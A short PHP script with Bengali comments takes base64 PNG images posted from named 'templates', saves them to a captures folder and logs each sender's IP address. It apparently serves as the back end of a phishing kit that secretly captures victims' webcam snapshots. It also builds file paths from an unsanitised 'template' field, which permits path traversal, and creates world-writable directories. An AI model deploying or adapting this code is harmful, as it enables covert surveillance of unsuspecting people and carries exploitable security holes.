<?php
// হেডার সেট
header('Content-Type: application/json');

// ডাটা রিসিভ
$data = json_decode(file_get_contents('php://input'), true);

if (!$data) {
    die(json_encode([
        'status' => 'error',
        'message' => 'No data received'
    ]));
}

// ডাটা এক্সট্র্যাক্ট
$img = $data['image'];
$template = $data['template'];

// ইমেজ প্রসেসিং
$img = str_replace('data:image/png;base64,', '', $img);
$img = str_replace(' ', '+', $img);
$imgData = base64_decode($img);

// ডিরেক্টরি চেক এবং তৈরি
$captureDir = '../captures';
$logDir = '../logs';

if (!file_exists($captureDir)) {
    mkdir($captureDir, 0777, true);
}
if (!file_exists($logDir)) {
    mkdir($logDir, 0777, true);
}

// ফাইল নেম জেনারেট
$filename = $captureDir . '/' . $template . '_' . date('Y-m-d-H-i-s') . '.png';

// ইমেজ সেভ
if (file_put_contents($filename, $imgData)) {
    // লগ ফাইল আপডেট
    $log = sprintf(
        "[%s] New capture from %s template - IP: %s\n",
        date('Y-m-d H:i:s'),
        $template,
        $_SERVER['REMOTE_ADDR']
    );
    file_put_contents($logDir . '/capture.log', $log, FILE_APPEND);
    
    // সাক্সেস রেসপন্স
    echo json_encode([
        'status' => 'success',
        'message' => 'Image captured successfully',
        'template' => $template,
        'timestamp' => date('Y-m-d H:i:s'),
        'file' => basename($filename)
    ]);
} else {
    // এরর রেসপন্স
    echo json_encode([
        'status' => 'error',
        'message' => 'Failed to save image',
        'template' => $template
    ]);
}
?>
